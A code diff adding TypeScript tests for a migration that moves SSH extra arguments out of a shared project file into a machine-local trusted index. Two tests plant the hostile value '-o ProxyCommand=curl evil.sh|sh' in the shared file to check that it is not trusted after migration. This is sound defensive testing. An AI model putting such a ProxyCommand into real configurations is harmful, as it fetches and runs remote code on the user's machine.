@@ -85,6 +85,134 @@ describe('v2 → v3 migration', () => {
   })
 })
 
+// I1: `ssh.extraArgs` HAS a producer (createSshTerminalNode copies it out of the machine-local SSH
+// server store), so every existing ssh-terminal node with a jump host has one in its CURRENT
+// project.json while the index has no `localExec` for it. Without a migration the first load after
+// the upgrade drops it (the connection breaks), and the next save erases it from disk and
+// propagates the deletion to every teammate via `rev`. Silently.
+describe('one-time exec migration (pre-existing project files)', () => {
+  /** A v3 index + project file written the way the PRE-fix app wrote them. */
+  const writeLegacy = async (extraArgs: string): Promise<void> => {
+    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
+    await fs.writeFile(
+      path.join(projRoot, '.nodeterm/project.json'),
+      JSON.stringify({
+        version: 1, rev: 3, savedAt: 'then', id: 'p1', name: 'foo', color: '#7aa2f7',
+        viewport: { x: 0, y: 0, zoom: 1 },
+        nodes: [
+          {
+            id: 'ssh-1', kind: 'terminal', position: { x: 0, y: 0 },
+            size: { width: 1, height: 1 }, title: 't', color: '#fff', group: null,
+            ssh: { host: 'h', user: 'u', extraArgs }
+          }
+        ]
+      })
+    )
+    await fs.writeFile(
+      path.join(userData, 'workspace.json'),
+      JSON.stringify({
+        version: 3, activeProjectId: 'p1',
+        entries: [{ id: 'p1', name: 'foo', color: '#7aa2f7', cwd: projRoot }]
+      })
+    )
+  }
+
+  it("hoists the file's exec values into the machine-local index, once, and keeps them working", async () => {
+    await writeLegacy('-o ProxyCommand=corp-proxy %h')
+    const store = new WorkspaceStore()
+    const loaded = await store.load()
+    // The jump host still reaches the node — and it is marked as this machine's own, so the exec
+    // site (buildSshArgs) honors it.
+    expect(loaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
+    expect(loaded.projects[0].nodes[0].ssh?.execTrusted).toBe(true)
+
+    await store.save(loaded)
+    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
+    expect(index.entries[0].localExec).toEqual({
+      'ssh-1': { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
+    })
+    expect(index.entries[0].execMigrated).toBe(true)
+    // …and it is gone from the SHARED file (that is the whole point).
+    const file = JSON.parse(
+      await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')
+    )
+    expect(file.nodes[0].ssh.extraArgs).toBeUndefined()
+    expect(file.nodes[0].ssh.host).toBe('h')
+    // The user is TOLD (one-time note), rather than finding out when something breaks.
+    expect(
+      fake.sent.some((m) => m.channel === 'workspace:migrated' && m.args[0] === 'exec')
+    ).toBe(true)
+  })
+
+  it('never hoists twice: a project file changed AFTER the migration cannot re-arm it', async () => {
+    await writeLegacy('-A')
+    const store = new WorkspaceStore()
+    await store.save(await store.load()) // migrates + records execMigrated
+    // A teammate (or an attacker with a PR) puts an exec-enabling value back into the shared file.
+    const fp = path.join(projRoot, '.nodeterm/project.json')
+    const f = JSON.parse(await fs.readFile(fp, 'utf-8'))
+    f.nodes[0].ssh.extraArgs = '-o ProxyCommand=curl evil.sh|sh'
+    f.rev = 99
+    await fs.writeFile(fp, JSON.stringify(f))
+
+    const reloaded = await new WorkspaceStore().load()
+    expect(reloaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-A') // OUR value, not the file's
+  })
+
+  it('an unreadable ref is not marked migrated — its values are hoisted when it comes back', async () => {
+    await writeLegacy('-o ProxyCommand=corp-proxy %h')
+    const gone = path.join(projRoot, '.nodeterm/project.json')
+    const keep = await fs.readFile(gone, 'utf-8')
+    await fs.rm(gone)
+
+    const store = new WorkspaceStore()
+    const loaded = await store.load()
+    expect(loaded.projects[0].unavailable).toBe(true)
+    await store.save(loaded)
+    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
+    expect(index.entries[0].execMigrated).toBeUndefined() // still owed
+
+    await fs.writeFile(gone, keep) // the disk is back
+    const back = await new WorkspaceStore().load()
+    expect(back.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
+  })
+
+  it('within ONE store instance, a deferred ref that comes back migrates exactly once', async () => {
+    // The offline→online recovery inside a single, long-lived store: the entry was deferred (its
+    // file was gone at first load), so its id sat in execUnmigrated. When the file returns and is
+    // read again, that deferral must be cleared — otherwise save() never records execMigrated, the
+    // hoist re-runs on every full load, and a project.json swapped in later would be re-hoisted.
+    await writeLegacy('-o ProxyCommand=corp-proxy %h')
+    const gone = path.join(projRoot, '.nodeterm/project.json')
+    const keep = await fs.readFile(gone, 'utf-8')
+    await fs.rm(gone)
+
+    const store = new WorkspaceStore()
+    const offline = await store.load()
+    expect(offline.projects[0].unavailable).toBe(true) // deferred → id in execUnmigrated
+
+    await fs.writeFile(gone, keep) // disk is back
+    const online = await store.load() // SAME instance re-reads the now-readable ref
+    expect(online.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
+
+    await store.save(online)
+    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
+    expect(index.entries[0].execMigrated).toBe(true) // deferral cleared → migration recorded once
+    expect(index.entries[0].localExec).toEqual({
+      'ssh-1': { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
+    })
+
+    // Now the migration is truly done: a hostile value put in the shared file afterward cannot be
+    // hoisted as trusted (proves it does NOT keep re-running).
+    const f = JSON.parse(await fs.readFile(gone, 'utf-8'))
+    f.nodes[0].ssh.extraArgs = '-o ProxyCommand=curl evil.sh|sh'
+    f.rev = 99
+    await fs.writeFile(gone, JSON.stringify(f))
+    const reloaded = await new WorkspaceStore().load()
+    expect(reloaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
+  })
+})
+
 describe('unavailable & corrupt refs', () => {
   it('marks a ref with a missing folder unavailable (kept, greyed) instead of dropping it', async () => {
     const store = new WorkspaceStore()
